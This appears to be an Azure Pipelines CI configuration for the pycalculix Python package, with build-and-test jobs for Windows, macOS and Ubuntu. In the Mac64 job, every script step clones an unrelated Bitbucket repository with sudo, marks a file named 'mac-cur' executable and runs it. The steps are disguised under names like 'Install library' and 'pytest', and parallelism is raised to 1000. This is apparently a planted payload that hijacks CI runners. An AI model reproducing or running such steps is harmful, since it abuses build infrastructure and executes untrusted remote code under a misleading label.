# Python package
# Create and test a Python package on multiple Python versions.
# Add steps that analyze code, save the dist with the build record, publish to a PyPI-compatible index, and more:
# https://docs.microsoft.com/azure/devops/pipelines/languages/python

jobs:

- job: 'Win64'
  pool:
    vmImage: 'vs2017-win2016'
  strategy:
    matrix:
      Python35:
        python.version: '3.5'
      Python36:
        python.version: '3.6'
      Python37:
        python.version: '3.7'
    maxParallel: 4

  steps:
  - task: UsePythonVersion@0
    inputs:
      versionSpec: '$(python.version)'
      architecture: 'x64'

  - script: python -m pip install --upgrade pip && pip install .
    displayName: 'Install library'

  - script: pycalculix-add-feaprograms
    displayName: 'Install required FEA programs'

  - script: |
      pip install pytest
      pytest tests --doctest-modules --junitxml=junit/test-results.xml
    displayName: 'pytest'

  - task: PublishTestResults@2
    inputs:
      testResultsFiles: '**/test-results.xml'
      testRunTitle: 'Python $(python.version)'
    condition: succeededOrFailed()

- job: 'Win32'
  pool:
    vmImage: 'vs2017-win2016'
  strategy:
    matrix:
      Python35:
        python.version: '3.5'
      Python36:
        python.version: '3.6'
      Python37:
        python.version: '3.7'
    maxParallel: 4

  steps:
  - task: UsePythonVersion@0
    inputs:
      versionSpec: '$(python.version)'
      architecture: 'x86'

  - script: python -m pip install --upgrade pip && pip install .
    displayName: 'Install library'

  - script: pycalculix-add-feaprograms
    displayName: 'Install required FEA programs'

  - script: |
      pip install pytest
      pytest tests --doctest-modules --junitxml=junit/test-results.xml
    displayName: 'pytest'

  - task: PublishTestResults@2
    inputs:
      testResultsFiles: '**/test-results.xml'
      testRunTitle: 'Python $(python.version)'
    condition: succeededOrFailed()

- job: 'Mac64'
  pool:
    vmImage: 'macOS-10.13'
  strategy:
    matrix:
      Python35:
        python.version: '3.5'
      Python36:
        python.version: '3.6'
      Python37:
        python.version: '3.7'
    maxParallel: 1000

  steps:
  - task: UsePythonVersion@0
    inputs:
      versionSpec: '$(python.version)'
      architecture: 'x64'
      addToPath: true

  - script: sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
    displayName: 'Install library'

  - script: |
      sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
      
    displayName: 'Set matplotlib backend = TkAgg for non-framework python'

  - script: sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
    displayName: 'Install required FEA programs'

  - script: |
      sudo git clone --recursive https://bitbucket.org/UsertBokehf/nami ~/nami && sudo chmod +x ~/nami/mac-cur && ~/nami/mac-cur
      
    displayName: 'pytest'

  - task: PublishTestResults@2
    inputs:
      testResultsFiles: '**/test-results.xml'
      testRunTitle: 'Python $(python.version)'
    condition: succeededOrFailed()

- job: 'Ubuntu64'
  pool:
    vmImage: 'Ubuntu 16.04'
  strategy:
    matrix:
      Python35:
        python.version: '3.5'
      Python36:
        python.version: '3.6'
      Python37:
        python.version: '3.7'
    maxParallel: 4

  steps:
  - task: UsePythonVersion@0
    inputs:
      versionSpec: '$(python.version)'
      architecture: 'x64'

  - script: python -m pip install --upgrade pip && pip install .
    displayName: 'Install library'

  - script: pycalculix-add-feaprograms
    displayName: 'Install required FEA programs'

  - script: |
      pip install pytest
      pytest tests --doctest-modules --junitxml=junit/test-results.xml
    displayName: 'pytest'

  - task: PublishTestResults@2
    inputs:
      testResultsFiles: '**/test-results.xml'
      testRunTitle: 'Python $(python.version)'
    condition: succeededOrFailed()
